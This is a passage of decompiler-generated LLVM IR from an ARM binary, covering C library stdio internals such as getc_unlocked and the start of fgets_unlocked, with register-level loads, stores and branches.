  %v2_18968 = icmp eq i32 %v1_18964, 0
  store i32 %v1_18964, i32* %v2_18960, align 4
  br i1 %v2_18968, label %dec_label_pc_18974, label %dec_label_pc_189d4

dec_label_pc_18974:                               ; preds = %dec_label_pc_18960
  %v0_18974 = load i32, i32* %r3.global-to-local, align 4
  %v1_18974 = load i32, i32* @r5, align 4
  %v2_18974 = add i32 %v1_18974, 64
  %v3_18974 = inttoptr i32 %v2_18974 to i32*
  store i32 %v0_18974, i32* %v3_18974, align 4
  %v0_18978 = load i32, i32* @r5, align 4
  %v1_18978 = add i32 %v0_18978, 56
  store i32 %v1_18978, i32* @r7, align 4
  br label %dec_label_pc_1897c

dec_label_pc_1897c:                               ; preds = %dec_label_pc_189ac.dec_label_pc_1897c_crit_edge, %dec_label_pc_18974
  %v0_18984 = phi i32 [ %v0_18984.pre, %dec_label_pc_189ac.dec_label_pc_1897c_crit_edge ], [ %v1_18978, %dec_label_pc_18974 ]
  %v0_1897c = phi i32 [ %v0_1897c.pre, %dec_label_pc_189ac.dec_label_pc_1897c_crit_edge ], [ %v0_18978, %dec_label_pc_18974 ]
  %v1_1897c = add i32 %v0_1897c, 56
  %v2_1897c = inttoptr i32 %v1_1897c to i32*
  %v3_1897c = load i32, i32* %v2_1897c, align 4
  store i32 %v3_1897c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18984, i32* %r2.global-to-local, align 4
  %v1_1898897 = inttoptr i32 %v0_18984 to i32*
  %v2_1898898 = load i32, i32* %v1_1898897, align 4
  store i32 %v2_1898898, i32* %r3.global-to-local, align 4
  %v3_1898c100 = icmp uge i32 %v2_1898898, %v3_1897c
  store i1 %v3_1898c100, i1* %cpsr_c.global-to-local, align 1
  %v9_1898c106 = icmp eq i32 %v2_1898898, %v3_1897c
  br i1 %v9_1898c106, label %dec_label_pc_18994, label %dec_label_pc_189ac

dec_label_pc_18994:                               ; preds = %dec_label_pc_1897c, %dec_label_pc_18994.dec_label_pc_18988_crit_edge
  %v0_18994107 = phi i32 [ %v1_1898c.pre, %dec_label_pc_18994.dec_label_pc_18988_crit_edge ], [ %v3_1897c, %dec_label_pc_1897c ]
  store i32 %v0_18994107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_189a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_189a4, label %dec_label_pc_189a8, label %dec_label_pc_18994.dec_label_pc_18988_crit_edge

dec_label_pc_18994.dec_label_pc_18988_crit_edge:  ; preds = %dec_label_pc_18994
  %v0_18988.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1898c.pre = load i32, i32* @r4, align 4
  %v1_18988 = inttoptr i32 %v0_18988.pre to i32*
  %v2_18988 = load i32, i32* %v1_18988, align 4
  store i32 %v2_18988, i32* %r3.global-to-local, align 4
  %v3_1898c = icmp uge i32 %v2_18988, %v1_1898c.pre
  store i1 %v3_1898c, i1* %cpsr_c.global-to-local, align 1
  %v9_1898c = icmp eq i32 %v2_18988, %v1_1898c.pre
  br i1 %v9_1898c, label %dec_label_pc_18994, label %dec_label_pc_189ac

dec_label_pc_189a8:                               ; preds = %dec_label_pc_18994
  %v0_189a8 = load i32, i32* @r4, align 4
  store i32 %v0_189a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_189ac

dec_label_pc_189ac:                               ; preds = %dec_label_pc_1897c, %dec_label_pc_18994.dec_label_pc_18988_crit_edge, %dec_label_pc_189a8
  %v0_189b4 = phi i32 [ %v0_189a8, %dec_label_pc_189a8 ], [ %v2_1898898, %dec_label_pc_1897c ], [ %v2_18988, %dec_label_pc_18994.dec_label_pc_18988_crit_edge ]
  %v1_189ac = phi i32 [ %v0_189a8, %dec_label_pc_189a8 ], [ %v3_1897c, %dec_label_pc_1897c ], [ %v1_1898c.pre, %dec_label_pc_18994.dec_label_pc_18988_crit_edge ]
  %v3_189ac = icmp uge i32 %v0_189b4, %v1_189ac
  store i1 %v3_189ac, i1* %cpsr_c.global-to-local, align 1
  %v9_189ac = icmp eq i32 %v0_189b4, %v1_189ac
  br i1 %v9_189ac, label %dec_label_pc_189b4, label %dec_label_pc_189ac.dec_label_pc_1897c_crit_edge

dec_label_pc_189ac.dec_label_pc_1897c_crit_edge:  ; preds = %dec_label_pc_189ac
  %v0_1897c.pre = load i32, i32* @r5, align 4
  %v0_18984.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1897c

dec_label_pc_189b4:                               ; preds = %dec_label_pc_189ac
  %v2_189b4 = icmp ne i32 %v1_189ac, 0
  store i1 %v2_189b4, i1* %cpsr_c.global-to-local, align 1
  %v7_189b8 = icmp slt i32 %v1_189ac, 2
  br i1 %v7_189b8, label %dec_label_pc_189d4, label %dec_label_pc_189bc

dec_label_pc_189bc:                               ; preds = %dec_label_pc_189b4
  %v0_189bc = load i32, i32* @r5, align 4
  %v1_189bc = add i32 %v0_189bc, 56
  store i32 %v1_189bc, i32* %r0.global-to-local, align 4
  %v0_189c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_189c0 = add i32 %v0_189c0, 129
  store i32 %v1_189c0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_189d4

dec_label_pc_189d4:                               ; preds = %dec_label_pc_18960, %dec_label_pc_189bc, %dec_label_pc_189b4, %bb71, %dec_label_pc_1889c
  %v0_189d4 = load i32, i32* @r5, align 4
  %v1_189d4 = add i32 %v0_189d4, 32
  %v2_189d4 = inttoptr i32 %v1_189d4 to i32*
  %v3_189d4 = load i32, i32* %v2_189d4, align 4
  store i32 %v3_189d4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_189d8 = icmp eq i32 %v3_189d4, 0
  br i1 %v2_189d8, label %dec_label_pc_189e0, label %dec_label_pc_1889c

dec_label_pc_189e0:                               ; preds = %dec_label_pc_189d4, %dec_label_pc_1888c
  %v0_189e0 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_189e0, i32* %r0.global-to-local, align 4
  %v0_18a1c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_189e8:                               ; preds = %dec_label_pc_186c4
  %v3_189e8 = load i16, i16* %arg1, align 2
  %v4_189e8 = zext i16 %v3_189e8 to i32
  %v1_189ec = and i32 %v4_189e8, 64
  store i32 %v1_189ec, i32* %r3.global-to-local, align 4
  %v2_189ec = icmp eq i32 %v1_189ec, 0
  br i1 %v2_189ec, label %bb72, label %dec_label_pc_189f8

bb72:                                             ; preds = %dec_label_pc_189e8
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_189f8:                               ; preds = %dec_label_pc_189e8
  %v2_189f8 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_189f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_189fc = icmp eq i32 %v2_189f8, 0
  br i1 %v2_189fc, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_189f8
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_189f8
  %v1_18a00 = load i32, i32* @r4, align 4
  %v2_18a00 = inttoptr i32 %v1_18a00 to i16*
  %v3_18a00 = load i16, i16* %v2_18a00, align 2
  %v4_18a00 = zext i16 %v3_18a00 to i32
  store i32 %v4_18a00, i32* %r3.global-to-local, align 4
  %v2_18a04 = add i32 %v1_18a00, 8
  %v3_18a04 = inttoptr i32 %v2_18a04 to i32*
  %v4_18a04 = load i32, i32* %v3_18a04, align 4
  store i32 %v4_18a04, i32* %r2.global-to-local, align 4
  %v2_18a08 = and i32 %v4_18a00, 65471
  store i32 %v2_18a08, i32* %r3.global-to-local, align 4
  %v2_18a0c = trunc i32 %v2_18a08 to i16
  store i16 %v2_18a0c, i16* %v2_18a00, align 2
  %v1_18a10 = load i32, i32* %r2.global-to-local, align 4
  %v2_18a10 = load i32, i32* @r4, align 4
  %v3_18a10 = add i32 %v2_18a10, 28
  %v4_18a10 = inttoptr i32 %v3_18a10 to i32*
  store i32 %v1_18a10, i32* %v4_18a10, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_189e0, %.thread14
  %v0_18a1c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_18a1c.pre, %dec_label_pc_189e0 ], [ 0, %.thread14 ]
  store i32 %v0_18a1c, i32* %r0.global-to-local, align 4
  store i32 %v6_18698, i32* %r5.global-to-local, align 4
  ret i32 %v0_18a1c

; uselistorder directives
  uselistorder i32 %v0_18a1c, { 1, 0 }
  uselistorder i32 %v3_189d4, { 1, 2, 0 }
  uselistorder i32 %v0_189a8, { 1, 0, 2 }
  uselistorder i32 %v1_1898c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1892c, { 1, 0, 2 }
  uselistorder i32 %v0_188f4, { 1, 0, 2 }
  uselistorder i32 %v1_188d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_188bc, { 1, 0 }
  uselistorder i32 %v0_18860, { 1, 0, 2 }
  uselistorder i32 %v1_18844.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18834, { 1, 0 }
  uselistorder i32 %v0_187f8, { 1, 0, 2 }
  uselistorder i32 %v1_187dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_187c4, { 1, 0 }
  uselistorder i32 %v0_1878c, { 1, 0, 2 }
  uselistorder i32 %v1_18770.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18760, { 1, 0 }
  uselistorder i32 %v0_1871c, { 1, 0, 2 }
  uselistorder i32 %v1_18700.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_186d8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 52, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 51, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 31, 32, 4, 5, 6, 7, 8, 29, 30, 9, 10, 28, 12, 13, 14, 33, 34, 15, 16, 17, 35, 36, 18, 19, 20, 21, 37, 38, 22, 23, 24, 39, 40, 25, 26, 27 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_189d4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_189ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18994, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18914, { 1, 0 }
  uselistorder label %dec_label_pc_18908, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_188f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_188e0, { 1, 0 }
  uselistorder label %dec_label_pc_1889c, { 1, 0 }
  uselistorder label %dec_label_pc_1888cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_18864, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1884c, { 1, 0 }
  uselistorder label %dec_label_pc_1880c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_187fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_187e4, { 1, 0 }
  uselistorder label %dec_label_pc_187b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18790, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18778, { 1, 0 }
  uselistorder label %dec_label_pc_18730, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_18720, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18708, { 1, 0 }
  uselistorder label %dec_label_pc_186d4, { 1, 0 }
}

define i32 @function_18a30(i32 %arg1) local_unnamed_addr {
dec_label_pc_18a30:
  %v0_18a30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a30, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18a30
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18a30, %bb
  %v10_18a40 = phi i32 [ %arg1, %dec_label_pc_18a30 ], [ 0, %bb ]
  ret i32 %v10_18a40

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_18a44 = load i32, i32* @r4, align 4
  store i32 %v3_18a44, i32* %stack_var_-12, align 4
  %v6_18a44 = load i32, i32* @r5, align 4
  %v9_18a44 = load i32, i32* @lr, align 4
  %v0_18a48 = load i32, i32* @r0, align 4
  %v1_18a48 = add i32 %v0_18a48, 16
  %v2_18a48 = inttoptr i32 %v1_18a48 to i32*
  %v3_18a48 = load i32, i32* %v2_18a48, align 4
  store i32 %v3_18a48, i32* %r2.global-to-local, align 4
  %v1_18a4c = add i32 %v0_18a48, 24
  %v2_18a4c = inttoptr i32 %v1_18a4c to i32*
  %v3_18a4c = load i32, i32* %v2_18a4c, align 4
  %v3_18a50 = icmp ult i32 %v3_18a48, %v3_18a4c
  store i32 %v0_18a48, i32* @r4, align 4
  br i1 %v3_18a50, label %bb, label %dec_label_pc_18a70

bb:                                               ; preds = %entry
  %v2_18a5c = inttoptr i32 %v3_18a48 to i8*
  %v3_18a5c = load i8, i8* %v2_18a5c, align 1
  %v4_18a5c = zext i8 %v3_18a5c to i32
  store i32 %v4_18a5c, i32* %r0.global-to-local, align 4
  %v6_18a5c = add i32 %v3_18a48, 1
  store i32 %v6_18a5c, i32* %r2.global-to-local, align 4
  store i32 %v6_18a5c, i32* %v2_18a48, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18a70:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r5, align 4
  %v1_18a70 = inttoptr i32 %v0_18a48 to i16*
  %v2_18a70 = load i16, i16* %v1_18a70, align 2
  %v3_18a70 = zext i16 %v2_18a70 to i32
  %v1_18a74 = and i32 %v3_18a70, 131
  %tmp25 = icmp ugt i32 %v1_18a74, 128
  br i1 %tmp25, label %dec_label_pc_18a90, label %dec_label_pc_18a80

dec_label_pc_18a80:                               ; preds = %dec_label_pc_18a70
  store i32 128, i32* @r1, align 4
  %v0_18a84 = call i32 @__stdio_trans2r_o()
  store i32 %v0_18a84, i32* %r0.global-to-local, align 4
  %v2_18a88 = icmp eq i32 %v0_18a84, 0
  br i1 %v2_18a88, label %dec_label_pc_18a80.dec_label_pc_18a90_crit_edge, label %dec_label_pc_18b58

dec_label_pc_18a80.dec_label_pc_18a90_crit_edge:  ; preds = %dec_label_pc_18a80
  %v0_18a90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18a90

dec_label_pc_18a90:                               ; preds = %dec_label_pc_18a80.dec_label_pc_18a90_crit_edge, %dec_label_pc_18a70
  %v2_18ad0 = phi i32 [ %v0_18a90.pre, %dec_label_pc_18a80.dec_label_pc_18a90_crit_edge ], [ %v0_18a48, %dec_label_pc_18a70 ]
  %v1_18a90 = inttoptr i32 %v2_18ad0 to i16*
  %v2_18a90 = load i16, i16* %v1_18a90, align 2
  %v3_18a90 = zext i16 %v2_18a90 to i32
  store i32 %v3_18a90, i32* %r2.global-to-local, align 4
  %v1_18a94 = and i32 %v3_18a90, 2
  %v2_18a94 = icmp eq i32 %v1_18a94, 0
  br i1 %v2_18a94, label %dec_label_pc_18ac0, label %dec_label_pc_18a9c

dec_label_pc_18a9c:                               ; preds = %dec_label_pc_18a90
  %tmp26 = urem i16 %v2_18a90, 2
  %v1_18a9c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_18a9c
  %v4_18aa0 = and i32 %tmp22, 4
  %v5_18aa0 = add i32 %v4_18aa0, %v2_18ad0
  %v1_18aa4 = add i32 %v5_18aa0, 36
  %v2_18aa4 = inttoptr i32 %v1_18aa4 to i8*
  %v3_18aa4 = load i8, i8* %v2_18aa4, align 1
  %v4_18aa4 = zext i8 %v3_18aa4 to i32
  %v1_18aa8 = add nsw i32 %v3_18a90, -1
  store i32 %v1_18aa8, i32* %r2.global-to-local, align 4
  store i32 %v4_18aa4, i32* %r0.global-to-local, align 4
  %v2_18ab4 = add i32 %v2_18ad0, 40
  %v3_18ab4 = inttoptr i32 %v2_18ab4 to i32*
  store i32 0, i32* %v3_18ab4, align 4
  %v0_18ab8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ab8 = trunc i32 %v0_18ab8 to i16
  %v2_18ab8 = load i32, i32* @r4, align 4
  %v3_18ab8 = inttoptr i32 %v2_18ab8 to i16*
  store i16 %v1_18ab8, i16* %v3_18ab8, align 2
  br label %dec_label_pc_18b5c

dec_label_pc_18ac0:                               ; preds = %dec_label_pc_18a90
  %v1_18ac0 = add i32 %v2_18ad0, 16
  %v1_18ac4 = inttoptr i32 %v1_18ac0 to i32*
  %v2_18ac4 = load i32, i32* %v1_18ac4, align 4
  store i32 %v2_18ac4, i32* @r1, align 4
  %v3_18ac4 = add i32 %v2_18ad0, 20
  %v4_18ac4 = inttoptr i32 %v3_18ac4 to i32*
  %v5_18ac4 = load i32, i32* %v4_18ac4, align 4
  %v9_18ac8 = icmp eq i32 %v5_18ac4, %v2_18ac4
  br i1 %v9_18ac8, label %dec_label_pc_18ad8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_18ac0
  %v2_18acc = inttoptr i32 %v2_18ac4 to i8*
  %v3_18acc = load i8, i8* %v2_18acc, align 1
  %v4_18acc = zext i8 %v3_18acc to i32
  store i32 %v4_18acc, i32* %r0.global-to-local, align 4
  %v6_18acc = add i32 %v2_18ac4, 1
  store i32 %v6_18acc, i32* @r1, align 4
  store i32 %v6_18acc, i32* %v1_18ac4, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18ad8:                               ; preds = %dec_label_pc_18ac0
  %v1_18ad8 = add i32 %v2_18ad0, 4
  %v2_18ad8 = inttoptr i32 %v1_18ad8 to i32*
  %v3_18ad8 = load i32, i32* %v2_18ad8, align 4
  %v7_18adc = icmp eq i32 %v3_18ad8, -2
  br i1 %v7_18adc, label %.thread7, label %dec_label_pc_18af0

.thread7:                                         ; preds = %dec_label_pc_18ad8
  %v2_18ae0 = or i16 %v2_18a90, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_18ae0, i16* %v1_18a90, align 2
  br label %dec_label_pc_18b5c

dec_label_pc_18af0:                               ; preds = %dec_label_pc_18ad8
  %v1_18af0 = and i32 %v3_18a90, 768
  %v2_18af0 = icmp eq i32 %v1_18af0, 0
  br i1 %v2_18af0, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_18af0
  %v1_18af8 = load i32, i32* @r5, align 4
  %v3_18af8 = add i32 %v1_18af8, 76
  %v4_18af8 = inttoptr i32 %v3_18af8 to i32*
  %v5_18af8 = load i32, i32* %v4_18af8, align 4
  store i32 %v5_18af8, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_18af0, %bb23
  store i32 101120, i32* @lr, align 4
  %v1_18afc = xor i1 %v2_18af0, true
  call void @__pseudo_cond_branch(i1 %v1_18afc, i32 ptrtoint (i32* @global_var_18698.1011 to i32))
  %v0_18b00 = load i32, i32* @r4, align 4
  %v1_18b00 = add i32 %v0_18b00, 8
  store i32 %v1_18b00, i32* %r2.global-to-local, align 4
  %v1_18b04 = inttoptr i32 %v1_18b00 to i32*
  %v2_18b04 = load i32, i32* %v1_18b04, align 4
  store i32 %v2_18b04, i32* %r2.global-to-local, align 4
  %v3_18b04 = add i32 %v0_18b00, 12
  %v4_18b04 = inttoptr i32 %v3_18b04 to i32*
  %v5_18b04 = load i32, i32* %v4_18b04, align 4
  %v9_18b08 = icmp eq i32 %v5_18b04, %v2_18b04
  br i1 %v9_18b08, label %dec_label_pc_18b3c, label %dec_label_pc_18b10

dec_label_pc_18b10:                               ; preds = %.thread9
  %v2_18b10 = add i32 %v0_18b00, 24
  %v3_18b10 = inttoptr i32 %v2_18b10 to i32*
  store i32 %v2_18b04, i32* %v3_18b10, align 4
  %v0_18b14 = load i32, i32* @r4, align 4
  store i32 %v0_18b14, i32* %r0.global-to-local, align 4
  %v2_18b18 = call i32 @__stdio_rfill(i32 %v0_18b14)
  store i32 %v2_18b18, i32* %r0.global-to-local, align 4
  %v2_18b1c = icmp eq i32 %v2_18b18, 0
  br i1 %v2_18b1c, label %dec_label_pc_18b58, label %dec_label_pc_18b24

dec_label_pc_18b24:                               ; preds = %dec_label_pc_18b10
  %v0_18b24 = load i32, i32* @r4, align 4
  %v1_18b24 = add i32 %v0_18b24, 20
  %v2_18b24 = inttoptr i32 %v1_18b24 to i32*
  %v3_18b24 = load i32, i32* %v2_18b24, align 4
  %v2_18b28 = add i32 %v0_18b24, 24
  %v3_18b28 = inttoptr i32 %v2_18b28 to i32*
  store i32 %v3_18b24, i32* %v3_18b28, align 4
  %v0_18b2c = load i32, i32* @r4, align 4
  %v1_18b2c = add i32 %v0_18b2c, 16
  %v2_18b2c = inttoptr i32 %v1_18b2c to i32*
  %v3_18b2c = load i32, i32* %v2_18b2c, align 4
  %v1_18b30 = inttoptr i32 %v3_18b2c to i8*
  %v2_18b30 = load i8, i8* %v1_18b30, align 1
  %v3_18b30 = zext i8 %v2_18b30 to i32
  store i32 %v3_18b30, i32* %r0.global-to-local, align 4
  %v5_18b30 = add i32 %v3_18b2c, 1
  store i32 %v5_18b30, i32* %v2_18b2c, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18b3c:                               ; preds = %.thread9
  %v1_18b3c = inttoptr i32 %v0_18b00 to i16*
  store i32 %v0_18b00, i32* %r0.global-to-local, align 4
  %v2_18b40 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_18b40, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_18b48 = call i32 @__stdio_READ(i16* %v1_18b3c, i32 %v2_18b40, i32 1)
  store i32 %v5_18b48, i32* %r0.global-to-local, align 4
  %v2_18b4c = icmp eq i32 %v5_18b48, 0
  br i1 %v2_18b4c, label %dec_label_pc_18b58, label %bb24

bb24:                                             ; preds = %dec_label_pc_18b3c
  %v4_18b50 = load i8, i8* %stack_var_-17, align 1
  %v5_18b50 = sext i8 %v4_18b50 to i32
  store i32 %v5_18b50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18b58:                               ; preds = %dec_label_pc_18b3c, %dec_label_pc_18a80, %dec_label_pc_18b10
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18b5c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_18b24, %dec_label_pc_18a9c, %dec_label_pc_18b58
  %v2_18b60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18b60, i32* @r4, align 4
  store i32 %v6_18a44, i32* @r5, align 4
  store i32 %v9_18a44, i32* @lr, align 4
  %v1_18b64 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18b64

; uselistorder directives
  uselistorder i32 %v2_18ac4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18ad0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_18a48, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18b5c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_18b58, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_18b70 = load i32, i32* @r6, align 4
  %v12_18b70 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18b74 = icmp eq i32 %arg2, 0
  store i1 %v2_18b74, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_18bfc, label %dec_label_pc_18be4.preheader

dec_label_pc_18be4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_18be42 = add i32 %arg2, -1
  store i32 %v1_18be42, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_18be48 = icmp eq i32 %arg2, 1
  store i1 %v7_18be48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18be48, label %dec_label_pc_18bec, label %dec_label_pc_18b90

dec_label_pc_18b90:                               ; preds = %dec_label_pc_18be4.preheader, %dec_label_pc_18be4.backedge.dec_label_pc_18b90_crit_edge
  %v0_18bb4 = phi i32 [ %v0_18b90.pre, %dec_label_pc_18be4.backedge.dec_label_pc_18b90_crit_edge ], [ %arg3, %dec_label_pc_18be4.preheader ]
  %v1_18b90 = add i32 %v0_18bb4, 16
  %v2_18b90 = inttoptr i32 %v1_18b90 to i32*
  %v3_18b90 = load i32, i32* %v2_18b90, align 4
  store i32 %v3_18b90, i32* %r2.global-to-local, align 4
  %v1_18b94 = add i32 %v0_18bb4, 24
  %v2_18b94 = inttoptr i32 %v1_18b94 to i32*
  %v3_18b94 = load i32, i32* %v2_18b94, align 4
  store i32 %v3_18b94, i32* %r3.global-to-local, align 4
  %v3_18b98 = icmp uge i32 %v3_18b90, %v3_18b94
  store i1 %v3_18b98, i1* %cpsr_c.global-to-local, align 1
  %v9_18b98 = icmp eq i32 %v3_18b90, %v3_18b94
  store i1 %v9_18b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18b98, label %dec_label_pc_18bb4, label %dec_label_pc_18ba0

dec_label_pc_18ba0:                               ; preds = %dec_label_pc_18b90
  %v1_18ba0 = inttoptr i32 %v3_18b90 to i8*
  %v2_18ba0 = load i8, i8* %v1_18ba0, align 1
  %v3_18ba0 = zext i8 %v2_18ba0 to i32
  store i32 %v3_18ba0, i32* %r3.global-to-local, align 4
  %v5_18ba0 = add i32 %v3_18b90, 1
  store i32 %v5_18ba0, i32* %r2.global-to-local, align 4
  %v2_18ba4 = load i32, i32* @r5, align 4
  %v3_18ba4 = inttoptr i32 %v2_18ba4 to i8*
  store i8 %v2_18ba0, i8* %v3_18ba4, align 1
  %v4_18ba4 = load i32, i32* @r5, align 4
  %v5_18ba4 = add i32 %v4_18ba4, 1
  store i32 %v5_18ba4, i32* @r5, align 4
  %v0_18ba8 = load i32, i32* %r3.global-to-local, align 4
  %v2_18ba8 = icmp ugt i32 %v0_18ba8, 9
  store i1 %v2_18ba8, i1* %cpsr_c.global-to-local, align 1
  %v7_18ba8 = icmp eq i32 %v0_18ba8, 10
  store i1 %v7_18ba8, i1* %cpsr_z.global-to-local, align 1
  %v0_18bac = load i32, i32* %r2.global-to-local, align 4
  %v1_18bac = load i32, i32* @r4, align 4
  %v2_18bac = add i32 %v1_18bac, 16
  %v3_18bac = inttoptr i32 %v2_18bac to i32*
  store i32 %v0_18bac, i32* %v3_18bac, align 4
  br i1 %v7_18ba8, label %dec_label_pc_18bec, label %dec_label_pc_18be4.backedge

dec_label_pc_18bb4:                               ; preds = %dec_label_pc_18b90
  %v1_18bb4 = inttoptr i32 %v0_18bb4 to i16*
